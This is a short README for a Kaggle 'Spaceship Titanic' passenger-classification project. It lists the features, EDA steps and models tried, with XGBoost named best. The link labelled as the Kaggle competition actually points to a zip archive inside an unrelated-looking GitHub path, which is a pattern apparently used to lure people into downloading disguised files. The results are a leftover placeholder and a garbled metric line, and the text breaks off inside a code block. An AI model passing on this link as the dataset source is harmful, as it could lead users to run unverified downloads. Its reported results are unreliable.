# Spaceship Titanic 🚀🛳️

This repository contains my **Spaceship Titanic Kaggle project**, where the goal is to **predict which passengers were transported safely** during the spaceship accident using machine learning.

## Dataset
The dataset comes from the [Spaceship Titanic Kaggle competition](https://github.com/mitansio/Spaceship_Titanic_from_kaggle/raw/refs/heads/main/pyloric/from-Titanic-kaggle-Spaceship-v1.6.zip).  
It includes passenger demographics, travel details, and cabin information.

**Target:** `Transported` (boolean – whether the passenger was safely transported)

## Features
- PassengerId
- HomePlanet
- CryoSleep
- Cabin
- Destination
- Age
- VIP
- RoomService, FoodCourt, ShoppingMall, Spa, VRDeck
- Name
- Transported (Target)

## Exploratory Data Analysis (EDA)
- Handled missing values and cleaned the dataset
- Visualized distributions and correlations
- Analyzed relationships between features and the target

## Modeling
- Tried multiple algorithms:
  - Logistic Regression
  - Random Forest
  - Gradient Boosting
  - **XGBoost** ✅ (Best performing model)
- Tuned hyperparameters and selected the best model using cross-validation

## Results
- Best performing model: **XGBoost**
- Evaluation metrics:
  - Accuracy: `[Your accuracy]`
  - R=F1-score

## How to Use
1. Clone the repository:
   ```bash
  
